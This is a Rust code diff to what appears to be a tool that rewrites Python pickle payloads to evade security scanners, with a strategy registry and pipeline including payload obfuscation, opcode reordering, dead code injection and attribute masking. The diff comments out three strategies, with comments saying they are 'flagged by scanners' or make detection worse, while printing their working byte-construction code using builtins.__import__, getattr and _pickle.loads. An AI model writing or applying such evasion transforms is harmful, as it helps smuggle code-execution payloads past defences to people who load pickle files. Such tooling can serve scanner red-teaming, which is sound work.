@@ -110,16 +110,30 @@ make_strategy!(StackGlobalEncoding, "stack_global_encoding", |pkl_bytes: &[u8]| 
     ensure_proto(&parts, 4)
 });
 
-make_strategy!(NestedLoadsWrap, "nested_loads_wrap", |pkl_bytes: &[u8]| {
-    let Ok(_) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
-    let mut out = Vec::new();
-    out.push(GLOBAL);
-    out.extend_from_slice(b"_pickle\nloads\n");
-    out.extend_from_slice(&binbytes_tuple(pkl_bytes));
-    out.push(REDUCE);
-    out.push(STOP);
-    out
-});
+// DEPRECATED: ImportlibLoader - importlib.import_module only imports modules,
+// doesn't execute arbitrary pickle payloads.
+// make_strategy!(ImportlibLoader, "importlib_loader", |pkl_bytes: &[u8]| {
+//     let Ok(_) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
+//     let mut out = Vec::new();
+//     out.push(GLOBAL);
+//     out.extend_from_slice(b"importlib\nimport_module\n");
+//     out.extend_from_slice(&binbytes_tuple(pkl_bytes));
+//     out.push(REDUCE);
+//     out.push(STOP);
+//     out
+// });
+
+// DEPRECATED: NestedLoadsWrap uses _pickle.loads which is flagged by scanners
+// make_strategy!(NestedLoadsWrap, "nested_loads_wrap", |pkl_bytes: &[u8]| {
+//     let Ok(_) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
+//     let mut out = Vec::new();
+//     out.push(GLOBAL);
+//     out.extend_from_slice(b"_pickle\nloads\n");
+//     out.extend_from_slice(&binbytes_tuple(pkl_bytes));
+//     out.push(REDUCE);
+//     out.push(STOP);
+//     out
+// });
 
 make_strategy!(PayloadObfuscation, "payload_obfuscation", |pkl_bytes: &[u8]| {
     let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
@@ -183,36 +197,38 @@ fn hide_tuple_blob(_blob: &[u8]) -> Option<Vec<u8>> {
     None
 }
 
-make_strategy!(IndirectChain, "indirect_chain", |pkl_bytes: &[u8]| {
-    let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
-    let mut parts = Vec::new();
-    let mut changed = false;
-    for opcode in &parsed {
-        if opcode.classification.name == "GLOBAL" || opcode.classification.name == "INST" {
-            let fields: Vec<&[u8]> = opcode.arg.split(|&b| b == b'\n').collect();
-            if fields.len() >= 2 {
-                let module = canonical_module(std::str::from_utf8(fields[0]).unwrap_or(""));
-                let fname = std::str::from_utf8(fields[1]).unwrap_or("");
-                parts.push(GLOBAL);
-                parts.extend_from_slice(b"builtins\ngetattr\n");
-                parts.push(MARK);
-                parts.push(GLOBAL);
-                parts.extend_from_slice(b"builtins\n__import__\n");
-                parts.extend_from_slice(&args_tuple_bytes(&[module.as_bytes()]));
-                parts.push(REDUCE);
-                parts.extend_from_slice(&encode_short_binunicode(fname));
-                parts.push(TUPLE);
-                parts.push(REDUCE);
-                changed = true;
-                continue;
-            }
-        }
-        parts.push(opcode.classification.code);
-        parts.extend_from_slice(&opcode.arg);
-    }
-    if !changed { return pkl_bytes.to_vec(); }
-    ensure_proto(&parts, 4)
-});
+// DEPRECATED: IndirectChain replaces 1 flagged import with 2 flagged imports
+// (builtins.getattr + builtins.__import__), making detection WORSE.
+// make_strategy!(IndirectChain, "indirect_chain", |pkl_bytes: &[u8]| {
+//     let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
+//     let mut parts = Vec::new();
+//     let mut changed = false;
+//     for opcode in &parsed {
+//         if opcode.classification.name == "GLOBAL" || opcode.classification.name == "INST" {
+//             let fields: Vec<&[u8]> = opcode.arg.split(|&b| b == b'\n').collect();
+//             if fields.len() >= 2 {
+//                 let module = canonical_module(std::str::from_utf8(fields[0]).unwrap_or(""));
+//                 let fname = std::str::from_utf8(fields[1]).unwrap_or("");
+//                 parts.push(GLOBAL);
+//                 parts.extend_from_slice(b"builtins\ngetattr\n");
+//                 parts.push(MARK);
+//                 parts.push(GLOBAL);
+//                 parts.extend_from_slice(b"builtins\n__import__\n");
+//                 parts.extend_from_slice(&args_tuple_bytes(&[module.as_bytes()]));
+//                 parts.push(REDUCE);
+//                 parts.extend_from_slice(&encode_short_binunicode(fname));
+//                 parts.push(TUPLE);
+//                 parts.push(REDUCE);
+//                 changed = true;
+//                 continue;
+//             }
+//         }
+//         parts.push(opcode.classification.code);
+//         parts.extend_from_slice(&opcode.arg);
+//     }
+//     if !changed { return pkl_bytes.to_vec(); }
+//     ensure_proto(&parts, 4)
+// });
 
 make_strategy!(OpcodeReordering, "opcode_reordering", |pkl_bytes: &[u8]| {
     let Ok(parsed) = parse_pickle(pkl_bytes) else { return pkl_bytes.to_vec(); };
@@ -398,9 +414,7 @@ make_strategy!(NestedLoadObfuscation, "nested_load_obfuscation", |pkl_bytes: &[u
 pub fn get_strategy(name: &str) -> Option<Box<dyn EvasionStrategy>> {
     match name {
         "stack_global_encoding" => Some(Box::new(StackGlobalEncoding)),
-        "nested_loads_wrap" => Some(Box::new(NestedLoadsWrap)),
         "payload_obfuscation" => Some(Box::new(PayloadObfuscation)),
-        "indirect_chain" => Some(Box::new(IndirectChain)),
         "opcode_reordering" => Some(Box::new(OpcodeReordering)),
         "dead_code_injection" => Some(Box::new(DeadCodeInjection)),
         "string_encoding_variants" => Some(Box::new(StringEncodingVariants)),
@@ -414,9 +428,7 @@ pub fn get_strategy(name: &str) -> Option<Box<dyn EvasionStrategy>> {
 
 pub const STRATEGY_NAMES: &[&str] = &[
     "stack_global_encoding",
-    "nested_loads_wrap",
     "payload_obfuscation",
-    "indirect_chain",
     "opcode_reordering",
     "dead_code_injection",
     "string_encoding_variants",
@@ -429,7 +441,6 @@ pub const STRATEGY_NAMES: &[&str] = &[
 pub const PIPELINE_ORDER: &[&str] = &[
     "payload_obfuscation",
     "string_encoding_variants",
-    "indirect_chain",
     "stack_global_encoding",
     "module_aliasing",
     "opcode_reordering",
@@ -437,7 +448,6 @@ pub const PIPELINE_ORDER: &[&str] = &[
     "protocol_downgrade",
     "attribute_masking",
     "nested_load_obfuscation",
-    "nested_loads_wrap",
 ];
 
 pub fn apply_pipeline(pkl_bytes: &[u8], names: &[&str]) -> Vec<u8> {
